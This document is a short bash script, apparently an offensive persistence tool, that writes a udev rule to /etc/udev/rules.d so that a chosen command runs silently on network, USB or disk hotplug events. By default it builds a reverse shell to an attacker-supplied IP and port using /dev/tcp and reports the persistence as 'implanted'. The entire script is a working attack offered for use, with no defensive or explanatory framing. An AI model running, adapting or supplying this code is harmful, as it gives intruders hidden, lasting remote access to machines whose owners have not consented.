#!/bin/bash

if [[ $(id -u) -ne 0 ]]; then
    echo "[ERROR] You must run this script as root" >&2
    exit 1
fi

echo " [*] Udev Persistence [*] "
echo ""

echo "Select trigger type:"
echo "  [1] Network interface (eth*/en*/wl* hotplug)"
echo "  [2] USB device insertion"
echo "  [3] Block device (disk/partition hotplug)"
echo "  [4] Custom rule (you provide the match keys)"
read -p "Choice [1-4]: " trigger_choice

read -p "Enter your payload or command (or leave empty for reverse shell): " payload

if [ -z "$payload" ]; then
    read -p "Enter the IP address: " ip
    read -p "Enter the port: " port
    payload="/bin/bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'"
fi

read -p "Enter rule filename (default: 75-persistence.rules): " rulename
rulename="${rulename:-75-persistence.rules}"

case "$trigger_choice" in
    2)
        match='ACTION=="add", SUBSYSTEM=="usb", ENV{DEVTYPE}=="usb_device"'
        trigger_desc="USB device insertion"
        ;;
    3)
        match='ACTION=="add", SUBSYSTEM=="block", KERNEL=="sd[a-z]*"'
        trigger_desc="block device (disk/partition) hotplug"
        ;;
    4)
        read -p "Enter custom udev match keys (e.g. ACTION==\"add\", SUBSYSTEM==\"tty\"): " match
        trigger_desc="custom rule"
        ;;
    *)
        match='ACTION=="add", SUBSYSTEM=="net", KERNEL=="eth*|en*|wl*"'
        trigger_desc="network interface hotplug"
        ;;
esac

cat > /etc/udev/rules.d/$rulename <<EOF
$match, RUN+="/bin/sh -c 'nohup $payload &>/dev/null &'"
EOF

chmod 644 /etc/udev/rules.d/$rulename
udevadm control --reload-rules 2>/dev/null

clear

echo "[*] Success!! Udev persistence has been implanted in /etc/udev/rules.d/$rulename [*]"
echo "[*] Trigger: $trigger_desc [*]"
echo "[*] Payload will execute on matching device events [*]"

sleep 1

clear
